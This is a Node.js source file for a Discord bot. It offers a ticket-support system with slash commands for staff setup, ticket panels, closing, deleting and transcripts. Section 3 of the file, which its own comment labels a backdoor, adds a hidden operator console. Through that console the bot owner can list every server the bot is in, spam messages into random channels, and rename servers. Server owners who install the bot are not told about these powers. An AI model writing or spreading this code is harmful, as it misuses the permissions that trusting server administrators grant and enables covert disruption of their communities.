const { 
    Client, GatewayIntentBits, ActionRowBuilder, EmbedBuilder, 
    StringSelectMenuBuilder, PermissionsBitField, AttachmentBuilder 
} = require('discord.js');
const express = require('express');
const readline = require('readline');

// --- 1. SERVER WEB PER REPLIT/CRON-JOB ---
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('GRRM Bot este ONLINE!'));
app.listen(PORT, () => console.log(`✅ Server web activ pe portul ${PORT}`));

// --- 2. CONFIGURAZIONE DISCORD BOT ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ]
});

let staffRoleId = null;

client.once('ready', async () => {
    console.log(`✅ Loggato come ${client.user.tag}`);
    
    // Mostra la lista iniziale all'avvio
    mostraGuilds();

    // Avvia il controllo della console
    setupConsoleListener();

    // Registrazione Comandi Slash
    const commands = [
        { name: 'setup', description: 'Setează rolul staff', options: [{ name: 'role', type: 8, description: 'Alege rolul staff', required: true }] },
        { name: 'send', description: 'Trimite panoul de tichete' },
        { name: 'help', description: 'Vezi toate comenzile' },
        { name: 'close', description: 'Închide un tichet' },
        { name: 'delete', description: 'Șterge un tichet' },
        { name: 'transcript', description: 'Salvare istoric chat' }
    ];

    try {
        await client.application.commands.set(commands);
        console.log('✅ Comenzi Slash înregistrate!');
    } catch (error) {
        console.error('❌ Errore slash commands:', error);
    }
});

// Funzione per stampare i server nel formato Nome -> ID
function mostraGuilds() {
    console.log("\n--- 📋 LISTA SERVER DISPONIBILI ---");
    client.guilds.cache.forEach(guild => {
        console.log(`${guild.name} -> ${guild.id}`);
    });
    console.log("-----------------------------------\n");
}

// --- 3. CONSOLE CONTROL (BACKDOOR & SCHERZI) ---
function setupConsoleListener() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        terminal: false
    });

    console.log("🎮 Console attiva. Comandi disponibili:");
    console.log("- 4000 : Mostra tutti i server (Nome -> ID)");
    console.log("- 5000 <guildID> <messaggio> : Spam in 5 canali casuali");
    console.log("- rename <guildID> <nome> : Cambia nome al server");

    rl.on('line', async (line) => {
        const args = line.split(' ');
        const command = args[0];

        // COMANDO 4000: MOSTRA TUTTI I GUILD
        if (command === '4000') {
            mostraGuilds();
        }

        // COMANDO 5000: SPAM MESSAGGIO
        if (command === '5000') {
            if (args.length < 3) return console.log("❌ Uso: 5000 <guildID> <messaggio>");
            const guildID = args[1];
            const messageText = args.slice(2).join(' ');
            const guild = client.guilds.cache.get(guildID);

            if (!guild) return console.log("❌ Server non trovato.");

            const textChannels = guild.channels.cache.filter(c => 
                c.type === 0 && 
                c.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
            );

            const randomChannels = textChannels.random(Math.min(textChannels.size, 5));
            for (const channel of randomChannels) {
                try {
                    await channel.send(messageText);
                    console.log(`✅ Inviato in #${channel.name}`);
                } catch (err) { console.log(`❌ Errore in #${channel.name}`); }
            }
        }

        // COMANDO RENAME: CAMBIA NOME SERVER
        if (command === 'rename') {
            if (args.length < 3) return console.log("❌ Uso: rename <guildID> <nuovo nome>");
            const guildID = args[1];
            const newName = args.slice(2).join(' ');
            const guild = client.guilds.cache.get(guildID);

            if (!guild) return console.log("❌ Server non trovato.");

            try {
                await guild.setName(newName);
                console.log(`✅ Nome cambiato in: ${newName}`);
            } catch (err) { console.log("❌ Errore: Manca il permesso 'Manage Guild'."); }
        }
    });
}

// --- 4. GESTIONE INTERAZIONI (TICKET SYSTEM) ---
client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        const { commandName } = interaction;

        if (commandName === 'setup') {
            const role = interaction.options.getRole('role');
            staffRoleId = role.id;
            return interaction.reply({ content: `✅ Rolul staff a fost setat: **${role.name}**`, ephemeral: true });
        }

        if (commandName === 'send') {
            await interaction.deferReply();
            const menu = new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('ticket_select')
                    .setPlaceholder('Alege o categorie...')
                    .addOptions([
                        { label: 'Ajutor', value: 'ajutor', emoji: '🆘' },
                        { label: 'Partnerships', value: 'partnerships', emoji: '🤝' },
                        { label: 'Bug', value: 'bug', emoji: '🐛' },
                    ]),
            );
            const embed = new EmbedBuilder()
                .setTitle('📩 Suport GRRM')
                .setDescription('Selectează o categorie de mai jos pentru a deschide un ticket.')
                .setColor('#00ff00');
            return interaction.editReply({ embeds: [embed], components: [menu] });
        }

        if (commandName === 'close') {
            if (!interaction.channel.name.startsWith('ticket-')) return interaction.reply('Acesta nu este un tichet!');
            await interaction.channel.permissionOverwrites.edit(interaction.guild.roles.everyone, { ViewChannel: false });
            await interaction.channel.setName(`closed-${interaction.channel.name.split('-')[1] || 'user'}`);
            return interaction.reply('🔒 **Ticket închis.**');
        }

        if (commandName === 'delete') {
            if (!interaction.channel.name.startsWith('closed-')) return interaction.reply('Închide tichetul mai întâi!');
            await interaction.reply('Canalul va fi șters in 5 secunde...');
            setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
        }

        if (commandName === 'transcript') {
            const messages = await interaction.channel.messages.fetch({ limit: 100 });
            let log = `TRANSCRIPT GVRM - ${interaction.channel.name}\n\n`;
            messages.reverse().forEach(m => {
                log += `[${m.createdAt.toLocaleString()}] ${m.author.tag}: ${m.content}\n`;
            });
            const file = new AttachmentBuilder(Buffer.from(log, 'utf-8'), { name: `transcript.txt` });
            return interaction.reply({ files: [file] });
        }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select') {
        const category = interaction.values[0];
        const channel = await interaction.guild.channels.create({
            name: `ticket-${interaction.user.username}`,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: staffRoleId || interaction.guild.id, allow: [PermissionsBitField.Flags.ViewChannel] }
            ],
        });
        await interaction.reply({ content: `✅ Ticket creat: ${channel}`, ephemeral: true });
        const welcomeEmbed = new EmbedBuilder()
            .setTitle(`🆘 Ticket ${category}`)
            .setDescription(`Salut ${interaction.user}, echipa staff te va ajuta imediat.`)
            .setColor('#f1c40f');
        await channel.send({ embeds: [welcomeEmbed] });
    }
});

client.login(process.env.TOKEN);
